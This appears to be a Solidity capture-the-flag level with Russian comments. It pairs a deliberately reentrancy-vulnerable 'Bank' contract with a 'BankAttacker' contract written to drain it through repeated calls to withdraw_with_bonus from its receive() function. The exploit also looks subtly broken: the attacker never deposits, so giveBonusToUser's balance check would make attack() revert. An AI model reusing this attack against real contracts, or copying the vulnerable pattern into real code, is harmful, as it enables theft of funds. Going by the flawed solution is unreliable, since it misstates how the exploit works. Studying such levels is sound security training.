// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/*
Вам предстоит заключить сделку с простым банковским контрактом. 
Чтобы завершить уровень, вы должны украсть все средства из контракта.
*/

contract Bank {
    // Банк хранит депозиты пользователей в ETH и выплачивает персональные бонусы в ETH своим лучшим клиентам
    mapping(address => uint256) private _balances;
    mapping(address => uint256) private _bonuses_for_users;
    uint256 public totalUserFunds;
    uint256 public totalBonusesPaid;

    bool public completed;

    constructor() payable {
        require(
            msg.value > 0,
            "need to put some ETH to treasury during deployment"
        );
        // первый депозит для нашего любимого директора
        _balances[0xd3C2b1b1096729b7e1A13EfC76614c649Ba96F34] = msg.value;
    }

    receive() external payable {
        require(msg.value > 0, "need to put some ETH to treasury");
        _balances[msg.sender] += msg.value;
        totalUserFunds += msg.value;
    }

    function balanceOfETH(address _who) public view returns (uint256) {
        return _balances[_who];
    }

    function giveBonusToUser(address _who) external payable {
        require(msg.value > 0, "need to put some ETH to treasury");
        require(
            _balances[_who] > 0,
            "bonuses are only for users having deposited ETH"
        );
        _bonuses_for_users[_who] += msg.value;
    }

    function withdraw_with_bonus() external {
        require(
            _balances[msg.sender] > 0,
            "you need to store money in Bank to receive rewards"
        );

        uint256 rewards = _bonuses_for_users[msg.sender];
        if (rewards > 0) {
            address(msg.sender).call{value: rewards, gas: 1000000}("");
            totalBonusesPaid += rewards;
            _bonuses_for_users[msg.sender] = 0;
        }

        totalUserFunds -= _balances[msg.sender];
        _balances[msg.sender] = 0;
        address(msg.sender).call{value: _balances[msg.sender], gas: 1000000}(
            ""
        );
    }

    function setCompleted() external payable {
        // Банк ограблен, когда его баланс становится равен нулю
        require(
            address(this).balance == 0,
            "ETH balance of contract should be less, than Mavrodi initial deposit"
        );
        completed = true;
    }
}




interface IBank {
    function withdraw_with_bonus() external;
    function giveBonusToUser(address _who) external payable;
    function setCompleted() external payable;
}

contract BankAttacker {
    IBank public bank;
    address payable public owner;

    constructor(address _bankAddress) {
        bank = IBank(_bankAddress);
        owner = payable(msg.sender);
    }


    function attack() external payable {
        require(msg.sender == owner, "Only the owner can initiate the attack.");
        require(msg.value >= 0.01 ether, "Minimum attack value not met.");
        
        // Вызываем giveBonusToUser, чтобы установить контекст для атаки.
        bank.giveBonusToUser{value: msg.value / 2}(address(this));
        
        // Вызываем withdraw_with_bonus, чтобы начать реентранси.
        bank.withdraw_with_bonus();
    }

    // Реентранси происходит здесь.
    receive() external payable {
        if (address(bank).balance != 0) {
            bank.withdraw_with_bonus();
        } else {
            owner.transfer(address(this).balance);
        }
    }
}